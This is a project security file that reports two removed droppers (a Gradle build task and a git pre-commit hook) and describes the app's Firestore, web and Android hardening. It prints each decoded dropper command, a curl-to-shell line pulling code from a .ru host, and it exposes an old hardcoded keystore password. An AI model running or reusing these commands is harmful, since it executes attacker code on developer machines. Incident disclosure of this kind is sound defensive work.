# Security

## Incident — 31 October 2026: malware in the source tree

Two remote-code-execution droppers were found in the project as delivered and have been **removed** from this version:

| Where | Added | What it did |
|---|---|---|
| `dist/android/build.gradle` — a `tasks.all { preBuild … doLast }` block (commit `1191f02`, "Update build.gradle") | 31 Oct 2026 16:45 IST | Hex-encoded command that ran `curl -kLsf -d "p=android_gradle" https://w-wl0zpw.ru/a \| sh` in the background on every Gradle build |
| `.git/hooks/pre-commit` | 31 Oct 2026 16:40 IST | Base64-encoded command that ran `curl -fkLs -d "p=git" https://37yfj7n2jd5.ru/a \| sh` on every `git commit` |

The hook existed before the 16:45 commit, so it very likely **ran on the developer machine**. The release APKs in the old `dist/` were built at 16:28, before both droppers, and no malicious strings were found inside them. The six bundled vendor libraries were verified byte-identical to their npm releases.

### Required actions (owner)

1. **Treat the Mac that built this project as compromised.** Run a reputable malware scan or, preferably, reinstall macOS. Check `~/Library/LaunchAgents`, `/Library/LaunchDaemons`, login items, crontab and shell profiles for anything unfamiliar.
2. **From a clean device**, change the passwords for GitHub, Google/Firebase, email and Render, enable 2FA everywhere, revoke GitHub personal access tokens, SSH keys and OAuth apps, and review the GitHub security log, repository webhooks, deploy keys and Actions secrets.
3. **Revoke the Firebase service-account key** that was in `firebase-service-account.json` (private key id beginning `62c86c9b…`): Google Cloud → IAM → Service accounts → Keys → delete. It gave full admin access to the database.
4. **Replace the Android signing key.** `vastrenix-release.keystore` and its password (`vastrenix123`, hardcoded in the old build script) were in the archive. If the app was never published, generate a new upload key (README §4). If it is on Play, use Play App Signing and request an upload-key reset.
5. **Start a fresh git repository** from this cleaned folder instead of reusing the old history, which still contains the dropper commit and the old binaries. Before your first commit, check `.git/hooks/` contains only `*.sample` files.
6. Rotate the Render deploy credentials and any Razorpay keys that were ever on the old machine.

## Security model (this version)

**Tenancy and roles.** Enforced in `firestore.rules`, not in the app. A store at `/stores/{ownerUid}` is readable only by its owner, its *active* staff and platform admins. Auditors are read-only. Staff can't touch `staff`, `requests`, the store profile or the subscription. A join request can't ask for the admin role.

**Plans.** The owner can create only a fresh 7-day trial, once. Activating, extending or suspending a plan requires the `platformAdmin` custom claim. The app's old **Subscribe** button activated a paid plan with no payment, and the old rules allowed any staff member to write `meta/subscription`. Both are fixed. Business writes are refused server-side once the trial or plan has ended.

**Admin console.** Access needs the `platformAdmin` claim (set with `scripts/set-admin.js`). All data is rendered via `textContent`, the session uses session-only persistence, and every action is appended to `adminLog`, which can't be edited or deleted.

**Web app.**
- A strict Content-Security-Policy (`script-src 'self'`): no inline scripts, no third-party scripts, and no Google Fonts (fonts are self-hosted).
- All database values go through `esc()`. Image URLs are allow-listed by `safeImg()` (`data:image/*`, `https:`, `blob:`).
- jsPDF was upgraded from 2.5.2 to 4.2.1 to pick up security fixes.

**Android app.**
- Served from `https://appassets.androidplatform.net` via WebViewAssetLoader. `file://` access, content access and universal file access are disabled.
- The native bridge is a `WebMessageListener` restricted to the app origin and main frame. It can only save or share a generated file (type allow-list, sanitised name, 25 MB cap), open `https`/`upi`/`tel`/`mailto`/`whatsapp` links externally, and tint the system bars.
- The old bridge allowed arbitrary native HTTP requests (`fetchNative`) and runtime server-URL changes. It has been removed.
- Network config: HTTPS only, and user-installed CAs are trusted only in debug builds.
- No storage, media, notification or camera permissions. Backups are disabled. R8 minification is on for release.
- Release signing comes only from CI secrets or a git-ignored `key.properties`. There is no fallback password.

**Supply chain.** Dependencies are pinned. CI rejects private-key material in the bundle and builds with least-privilege `contents: read`.

## Reporting a vulnerability

Email **security@vastrenix.com** with steps to reproduce. Please don't open a public issue.

## Known limitations (roadmap)

These need server-side code (Cloud Functions on the Blaze plan) rather than rules alone:

- **Roles aren't enforced per collection on the server.** Any non-auditor staff member can technically write any business collection. The app's UI limits them by role, but a malicious insider using the API directly could edit invoices. Next step: write the ledger through a Cloud Function, or add per-role rules.
- **Trial abuse:** a new Firebase account gets a new 7-day trial. Next step: tie trials to a verified phone number or GSTIN.
- **No rate limiting** on support tickets or store-code lookups. Next step: Firebase App Check.
- UTRs approved before the `usedUtrs` ledger existed aren't in it. The admin console still warns on visible duplicates.
- GitHub Actions are pinned by version tag. Pin them to commit SHAs for maximum supply-chain safety.
